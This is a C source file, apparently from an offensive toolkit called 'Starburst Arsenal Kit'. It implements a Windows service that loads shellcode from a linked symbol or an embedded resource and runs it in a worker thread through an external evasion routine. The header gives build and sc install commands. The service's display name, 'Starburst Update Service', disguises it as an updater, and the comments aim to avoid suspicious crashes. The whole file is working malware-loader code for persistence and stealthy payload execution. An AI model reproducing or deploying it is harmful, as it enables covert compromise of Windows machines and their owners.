/*
 * Starburst Arsenal Kit - Windows Service Wrapper
 *
 * Full Windows service implementation that executes shellcode in a
 * worker thread after registering with the SCM. Handles start, stop,
 * and status transitions correctly to avoid suspicious service crashes.
 *
 * Build (MinGW):
 *   x86_64-w64-mingw32-gcc -O2 -s -o starburst_svc.exe \
 *       src/main_svc.c bypass/bypass_apc_self.c shellcode.o \
 *       -lkernel32 -ladvapi32
 *
 * Build (MSVC):
 *   cl /O2 src/main_svc.c bypass/bypass_apc_self.c shellcode.obj \
 *       /link kernel32.lib advapi32.lib
 *
 * Install:
 *   sc create StarburstSvc binPath= "C:\path\starburst_svc.exe"
 *   sc start StarburstSvc
 *
 * Uninstall:
 *   sc stop StarburstSvc
 *   sc delete StarburstSvc
 */

#include <windows.h>

/* --------------------------------------------------------------------
 * Configuration
 * ------------------------------------------------------------------ */
#ifndef SERVICE_NAME
#define SERVICE_NAME  "StarburstSvc"
#endif

#ifndef SERVICE_DISPLAY
#define SERVICE_DISPLAY  "Starburst Update Service"
#endif

/* --------------------------------------------------------------------
 * Bypass interface
 * ------------------------------------------------------------------ */
extern void execute_shellcode(unsigned char *shellcode, unsigned int shellcode_len);

/* --------------------------------------------------------------------
 * Shellcode symbols
 * ------------------------------------------------------------------ */
#ifndef SHELLCODE_FROM_RSRC
extern unsigned char  shellcode[];
extern unsigned int   shellcode_len;
#endif

#ifdef SHELLCODE_FROM_RSRC
#define IDR_SHELLCODE  101

static int load_shellcode_from_rsrc(unsigned char **out_buf, unsigned int *out_len)
{
    HRSRC   hRes;
    HGLOBAL hGlobal;
    LPVOID  pData;
    DWORD   dwSize;

    hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDR_SHELLCODE), "RCDATA");
    if (!hRes)
        return -1;

    hGlobal = LoadResource(NULL, hRes);
    if (!hGlobal)
        return -1;

    pData  = LockResource(hGlobal);
    dwSize = SizeofResource(NULL, hRes);
    if (!pData || dwSize == 0)
        return -1;

    *out_buf = (unsigned char *)pData;
    *out_len = (unsigned int)dwSize;
    return 0;
}
#endif

/* --------------------------------------------------------------------
 * Service globals
 * ------------------------------------------------------------------ */
static SERVICE_STATUS        g_ServiceStatus;
static SERVICE_STATUS_HANDLE g_StatusHandle  = NULL;
static HANDLE                g_StopEvent     = NULL;
static HANDLE                g_WorkerThread  = NULL;

/* --------------------------------------------------------------------
 * Update the service status with the SCM
 * ------------------------------------------------------------------ */
static void set_service_status(DWORD dwState, DWORD dwExitCode, DWORD dwWaitHint)
{
    static DWORD dwCheckPoint = 1;

    g_ServiceStatus.dwCurrentState  = dwState;
    g_ServiceStatus.dwWin32ExitCode = dwExitCode;
    g_ServiceStatus.dwWaitHint      = dwWaitHint;

    if (dwState == SERVICE_START_PENDING)
        g_ServiceStatus.dwControlsAccepted = 0;
    else
        g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    if (dwState == SERVICE_RUNNING || dwState == SERVICE_STOPPED)
        g_ServiceStatus.dwCheckPoint = 0;
    else
        g_ServiceStatus.dwCheckPoint = dwCheckPoint++;

    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

/* --------------------------------------------------------------------
 * Worker thread -- resolves and executes shellcode
 * ------------------------------------------------------------------ */
static DWORD WINAPI worker_thread(LPVOID lpParam)
{
    unsigned char *sc_buf = NULL;
    unsigned int   sc_len = 0;

    (void)lpParam;

#ifdef SHELLCODE_FROM_RSRC
    if (load_shellcode_from_rsrc(&sc_buf, &sc_len) != 0)
        return 1;
#else
    sc_buf = shellcode;
    sc_len = shellcode_len;
#endif

    if (sc_buf == NULL || sc_len == 0)
        return 1;

    execute_shellcode(sc_buf, sc_len);

    return 0;
}

/* --------------------------------------------------------------------
 * Service control handler
 * ------------------------------------------------------------------ */
static VOID WINAPI ServiceCtrlHandler(DWORD dwCtrl)
{
    switch (dwCtrl)
    {
    case SERVICE_CONTROL_STOP:
        set_service_status(SERVICE_STOP_PENDING, NO_ERROR, 3000);

        /* Signal the stop event so ServiceMain can clean up */
        if (g_StopEvent)
            SetEvent(g_StopEvent);

        break;

    case SERVICE_CONTROL_INTERROGATE:
        /* Fall through -- report current status */
        break;

    default:
        break;
    }

    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

/* --------------------------------------------------------------------
 * ServiceMain -- entry point called by the SCM
 * ------------------------------------------------------------------ */
static VOID WINAPI SvcMain(DWORD dwArgc, LPTSTR *lpszArgv)
{
    (void)dwArgc;
    (void)lpszArgv;

    /* Register the control handler */
    g_StatusHandle = RegisterServiceCtrlHandlerA(SERVICE_NAME, ServiceCtrlHandler);
    if (!g_StatusHandle)
        return;

    /* Initialize status structure */
    g_ServiceStatus.dwServiceType             = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;

    /* Report start pending */
    set_service_status(SERVICE_START_PENDING, NO_ERROR, 3000);

    /* Create the stop event */
    g_StopEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    if (!g_StopEvent)
    {
        set_service_status(SERVICE_STOPPED, GetLastError(), 0);
        return;
    }

    /* Report running */
    set_service_status(SERVICE_RUNNING, NO_ERROR, 0);

    /* Launch the worker thread */
    g_WorkerThread = CreateThread(NULL, 0, worker_thread, NULL, 0, NULL);

    /* Wait for the stop signal */
    WaitForSingleObject(g_StopEvent, INFINITE);

    /* Give the worker a moment to wind down, then terminate if needed */
    if (g_WorkerThread)
    {
        if (WaitForSingleObject(g_WorkerThread, 5000) == WAIT_TIMEOUT)
            TerminateThread(g_WorkerThread, 0);
        CloseHandle(g_WorkerThread);
    }

    CloseHandle(g_StopEvent);

    set_service_status(SERVICE_STOPPED, NO_ERROR, 0);
}

/* --------------------------------------------------------------------
 * main -- registers the service with the SCM
 * ------------------------------------------------------------------ */
int main(int argc, char *argv[])
{
    SERVICE_TABLE_ENTRYA ServiceTable[] = {
        { (LPSTR)SERVICE_NAME, (LPSERVICE_MAIN_FUNCTIONA)SvcMain },
        { NULL, NULL }
    };

    (void)argc;
    (void)argv;

    if (!StartServiceCtrlDispatcherA(ServiceTable))
    {
        /* If not running as a service (e.g. double-clicked), execute directly */
        DWORD err = GetLastError();
        if (err == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT)
        {
            /* Direct execution fallback for testing */
            worker_thread(NULL);
        }
    }

    return 0;
}
